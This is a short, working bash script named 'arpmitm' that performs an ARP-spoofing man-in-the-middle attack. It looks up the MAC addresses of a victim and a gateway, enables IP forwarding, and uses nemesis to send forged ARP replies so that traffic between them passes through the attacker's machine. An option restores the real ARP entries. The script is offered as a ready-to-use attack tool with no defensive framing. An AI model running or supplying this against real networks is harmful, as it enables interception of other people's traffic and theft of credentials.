#!/bin/bash
# use like: ./arpmitm -v [victim ip] -g [gateway ip]
GATEWAY=
VICTIM=
REPAIR=0
DEBUG=
INT=ndis0

set -- `getopt dv:g:ri: $*`
while [ $# -gt 0 ]; do
	case $1 in
		-g) shift; GATEWAY=$1 ;;
		-v) shift; VICTIM=$1 ;;
		-r) REPAIR=1 ;;
		-d) DEBUG=1 ;;
		-i) shift; INT=$1 ;;
	esac
	shift
done

if [ -z "$GATEWAY" -o -z "$VICTIM" ]; then
	echo "You must specify both a victim and a gateway"
	echo "Victim: $VICTIM"
	echo "Gateway: $VICTIM"
	exit;
fi

run() {
	[ -z "$DEBUG" ] || echo $*
	$*
}

getmac() {
	[ -z "$DEBUG" ] || echo "Looking up mac address for $1"
	if arp -n $1 | grep 'no entry' > /dev/null 2>&1; then
		ping -t 1 -c 1 $1
		if arp -n $1 | grep 'no entry' > /dev/null 2>&1; then
			echo "Unable to lookup mac for $1"
			exit 1
		fi
	fi
}

getmac $VICTIM
getmac $GATEWAY

getmac $VICTIM
getmac $GATEWAY

VICTIM_MAC=`arp -n $VICTIM | awk '{print $4}'`
GATEWAY_MAC=`arp -n $GATEWAY | awk '{print $4}'`
MY_MAC=`ifconfig $INT | grep ether | awk '{print $2}'`

if [ "$REPAIR" -eq 0 ]; then
	# Make sure we're setup to do packet forwarding
	# * This only works in freebsd. If you're using something like Linux, 
	#   you'll have to change this to enable ip forwarding
	run sudo sysctl net.inet.ip.forwarding=1

	echo "Telling $VICTIM that we're $GATEWAY"
	run sudo nemesis arp -S $GATEWAY -D $GATEWAY -H $MY_MAC -h $MY_MAC -M $VICTIM_MAC

	echo "Telling $GATEWAY that we're $VICTIM"
	run sudo nemesis arp -S $VICTIM -D $VICTIM -H $MY_MAC -h $MY_MAC -M $GATEWAY_MAC
else
	## Repair the arp tables 

	echo "Telling $VICTIM about the real gateway, $GATEWAY ($GATEWAY_MAC)"
	run sudo nemesis arp -S $GATEWAY -D $GATEWAY -H $GATEWAY_MAC -h $GATEWAY_MAC -M $VICTIM_MAC

	echo "Telling $GATEWAY about the real gateway, $VICTIM ($VICTIM_MAC)"
	run sudo nemesis arp -S $VICTIM -D $VICTIM -H $VICTIM_MAC -h $VICTIM_MAC -M $GATEWAY_MAC
fi

